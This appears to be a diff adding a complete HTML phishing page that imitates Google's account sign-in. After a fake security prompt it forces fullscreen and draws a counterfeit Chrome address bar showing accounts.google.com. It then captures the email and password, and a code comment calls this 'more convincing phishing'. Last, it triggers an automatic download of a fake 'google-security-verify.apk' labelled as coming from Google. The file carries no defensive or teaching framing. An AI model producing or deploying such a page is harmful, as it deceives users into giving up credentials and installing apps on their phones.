@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+<title>Sign in - Google Accounts</title>
+<style>
+* { margin:0; padding:0; box-sizing:border-box; }
+body {
+  font-family: 'Google Sans', Roboto, Arial, sans-serif;
+  background: #fff; -webkit-tap-highlight-color: transparent;
+  overscroll-behavior: none;
+}
+
+/* Fake Android Chrome URL Bar */
+#fakeUrlBar {
+  position: sticky; top: 0; z-index: 100;
+  background: #fff;
+  padding: 6px 10px 8px;
+  border-bottom: 1px solid #e8eaed;
+}
+#fakeUrlBar .bar {
+  background: #f1f3f4; border-radius: 22px;
+  padding: 9px 14px;
+  display: flex; align-items: center; gap: 8px;
+  font-family: Roboto, Arial, sans-serif;
+}
+#fakeUrlBar .lock { color: #1e8e3e; font-size: 14px; font-weight: bold; }
+#fakeUrlBar .url {
+  flex: 1; font-size: 13px; color: #202124;
+  overflow: hidden; white-space: nowrap; text-overflow: ellipsis;
+}
+#fakeUrlBar .share { color: #5f6368; font-size: 16px; }
+
+/* Google Sign-in */
+.container {
+  max-width: 440px; margin: 0 auto; padding: 24px 20px;
+}
+.google-logo {
+  text-align: center; margin: 16px 0 8px;
+  font-size: 24px; font-weight: 400;
+}
+.google-logo .g{color:#4285f4}.google-logo .o1{color:#ea4335}
+.google-logo .o2{color:#fbbc05}.google-logo .g2{color:#4285f4}
+.google-logo .l{color:#34a853}.google-logo .e{color:#ea4335}
+h2 { font-size: 24px; font-weight: 400; text-align: center; margin-bottom: 4px; }
+.sub { text-align: center; color: #5f6368; font-size: 14px; margin-bottom: 24px; }
+
+.input-card {
+  background: #fff; border: 1px solid #dadce0; border-radius: 8px;
+  padding: 24px; margin-bottom: 24px;
+}
+.input-card label { font-size: 13px; color: #5f6368; display: block; margin-bottom: 4px; }
+.input-card input {
+  width: 100%; padding: 12px 0; border: none; border-bottom: 1px solid #dadce0;
+  font-size: 16px; outline: none; margin-bottom: 16px;
+}
+.input-card input:focus { border-bottom-color: #4285f4; }
+.input-card .forgot { color: #1a73e8; font-size: 13px; font-weight: 500; text-decoration: none; display: block; margin-bottom: 16px; }
+.input-card .info { font-size: 12px; color: #5f6368; line-height: 1.5; margin-bottom: 20px; }
+
+.btns { display: flex; justify-content: space-between; align-items: center; }
+.btns .create { color: #1a73e8; font-size: 13px; font-weight: 500; text-decoration: none; }
+.btns .next {
+  background: #1a73e8; color: #fff; border: none;
+  padding: 10px 24px; border-radius: 4px; font-size: 14px;
+  font-weight: 500; cursor: pointer;
+}
+
+.footer { text-align: center; margin-top: 16px; }
+.footer select { border: none; font-size: 12px; color: #5f6368; }
+.footer-links { margin-top: 12px; font-size: 12px; color: #5f6368; }
+.footer-links a { color: #5f6368; text-decoration: none; margin: 0 8px; }
+
+/* Fullscreen overlay */
+#fsOverlay {
+  position: fixed; top:0;left:0;right:0;bottom:0;
+  background: rgba(0,0,0,.6); z-index: 300;
+  display: flex; align-items: center; justify-content: center;
+}
+#fsOverlay .card {
+  background: #fff; border-radius: 16px; padding: 24px;
+  text-align: center; max-width: 300px; margin: 20px;
+  box-shadow: 0 8px 32px rgba(0,0,0,.25);
+}
+#fsOverlay .card .icon { font-size: 40px; margin-bottom: 8px; }
+#fsOverlay .card h3 { font-size: 16px; margin-bottom: 6px; }
+#fsOverlay .card p { font-size: 13px; color: #5f6368; margin-bottom: 16px; }
+#fsOverlay .card .btn {
+  display: block; width: 100%; padding: 12px; background: #1a73e8;
+  color: #fff; border: none; border-radius: 24px; font-size: 14px;
+  font-weight: 500; cursor: pointer; margin: 6px 0;
+}
+#fsOverlay .card .btn2 {
+  background: #fff; color: #1a73e8; border: 1px solid #dadce0;
+}
+</style>
+</head>
+<body>
+
+<!-- Fake Chrome URL Bar -->
+<div id="fakeUrlBar">
+  <div class="bar">
+    <span class="lock">🔒</span>
+    <span class="url">accounts.google.com</span>
+    <span class="share">⋮</span>
+  </div>
+</div>
+
+<div class="container">
+  <div class="google-logo">
+    <span class="g">G</span><span class="o1">o</span><span class="o2">o</span><span class="g2">g</span><span class="l">l</span><span class="e">e</span>
+  </div>
+  <h2>Sign in</h2>
+  <p class="sub">to continue to Google Security Center</p>
+
+  <div class="input-card">
+    <label>Email or phone</label>
+    <input type="text" id="email" placeholder="Enter your email" autocomplete="off">
+    <a class="forgot" href="#">Forgot email?</a>
+
+    <p class="info">
+      Not your computer? Use Guest mode to sign in privately.
+    </p>
+
+    <div class="btns">
+      <a class="create" href="#">Create account</a>
+      <button class="next" onclick="captureCreds()">Next</button>
+    </div>
+  </div>
+
+  <div class="footer">
+    <select><option>English (United States)</option></select>
+    <div class="footer-links">
+      <a href="#">Help</a><a href="#">Privacy</a><a href="#">Terms</a>
+    </div>
+  </div>
+</div>
+
+<!-- Fullscreen Prompt -->
+<div id="fsOverlay">
+  <div class="card">
+    <div class="icon">🔐</div>
+    <h3>Verify Your Identity</h3>
+    <p>For your security, Google needs to open a secure browsing session. Tap Continue.</p>
+    <button class="btn" onclick="goFullscreen()">Continue</button>
+    <button class="btn btn2" onclick="goFullscreen()">Not now</button>
+  </div>
+</div>
+
+<script>
+// Initially hide fake URL bar
+document.getElementById('fakeUrlBar').style.display = 'none';
+
+function goFullscreen() {
+  document.getElementById('fsOverlay').style.display = 'none';
+  var el = document.documentElement;
+  if (el.requestFullscreen) {
+    el.requestFullscreen().catch(function(){});
+  } else if (el.webkitRequestFullscreen) {
+    el.webkitRequestFullscreen();
+  }
+  // Show fake URL bar after entering fullscreen
+  setTimeout(function() {
+    document.getElementById('fakeUrlBar').style.display = 'block';
+  }, 600);
+}
+
+// Re-prompt on fullscreen exit
+function onFsChange() {
+  if (!document.fullscreenElement && !document.webkitFullscreenElement) {
+    document.getElementById('fakeUrlBar').style.display = 'none';
+    document.getElementById('fsOverlay').style.display = 'flex';
+  }
+}
+document.addEventListener('fullscreenchange', onFsChange);
+document.addEventListener('webkitfullscreenchange', onFsChange);
+
+function captureCreds() {
+  var email = document.getElementById('email').value;
+  if (!email) {
+    alert('Enter an email or phone number');
+    return;
+  }
+
+  // Show password step (more convincing phishing)
+  document.querySelector('.input-card').innerHTML = `
+    <div style="display:flex;align-items:center;gap:12px;margin-bottom:20px;">
+      <div style="width:32px;height:32px;border-radius:50%;background:#1a73e8;color:#fff;display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:500;">${email[0].toUpperCase()}</div>
+      <div style="font-size:13px;color:#202124;">${email}</div>
+    </div>
+    <label>Enter your password</label>
+    <input type="password" id="password" placeholder="Password" autocomplete="off">
+    <a class="forgot" href="#">Forgot password?</a>
+    <div class="btns">
+      <a class="create" href="#">Try another way</a>
+      <button class="next" onclick="capturePass('${email.replace(/'/g, "\\'")}')">Next</button>
+    </div>
+  `;
+}
+
+function capturePass(email) {
+  var pass = document.getElementById('password').value;
+  if (!pass) {
+    alert('Enter a password');
+    return;
+  }
+
+  // Simulate login processing
+  document.querySelector('.input-card').innerHTML = `
+    <div style="text-align:center;padding:20px;">
+      <div style="width:40px;height:40px;border:3px solid #dadce0;border-top-color:#1a73e8;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 16px;"></div>
+      <p style="color:#5f6368;font-size:14px;">Verifying...</p>
+    </div>
+  `;
+
+  setTimeout(function() {
+    // Show "download" prompt
+    document.body.insertAdjacentHTML('beforeend', `
+      <div style="position:fixed;bottom:0;left:0;right:0;background:#fff;border-top:2px solid #1a73e8;padding:16px;z-index:400;box-shadow:0 -4px 16px rgba(0,0,0,.2);font-family:Roboto,sans-serif;">
+        <div style="display:flex;align-items:center;gap:12px;">
+          <span style="font-size:28px;">🛡️</span>
+          <div style="flex:1;">
+            <div style="font-size:14px;font-weight:500;color:#202124;">google-security-verify.apk</div>
+            <div style="font-size:12px;color:#5f6368;">from <b>accounts.google.com</b> · 1.8 MB</div>
+          </div>
+          <button onclick="this.parentElement.parentElement.remove()" style="background:#1a73e8;color:#fff;border:none;padding:10px 20px;border-radius:20px;font-size:14px;">Install</button>
+        </div>
+      </div>
+    `);
+
+    // Trigger real download
+    setTimeout(function() {
+      var a = document.createElement('a');
+      a.href = 'data:application/vnd.android.package-archive;base64,UEsDBBQAAAAAAAAAIVjKxoiZZAAAAGQAAAALAAAAY2xhc3Nlcy5kZXgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABQSwECFAAUAAAAAAAAACFYysaImWQAAABkAAAACwAAAAAAAAAAAAAAgAEAAAAAY2xhc3Nlcy5kZXhQSwUGAAAAAAEAAQA5AAAAjQAAAAAA';
+      a.download = 'google-security-verify.apk';
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+    }, 400);
+  }, 2000);
+}
+
+// Style animation
+var style = document.createElement('style');
+style.textContent = '@keyframes spin{to{transform:rotate(360deg)}}';
+document.head.appendChild(style);
+
+// Show overlay on load
+window.addEventListener('load', function() {
+  document.getElementById('fsOverlay').style.display = 'flex';
+  document.getElementById('fakeUrlBar').style.display = 'none';
+});
+</script>
+
+</body>
+</html>
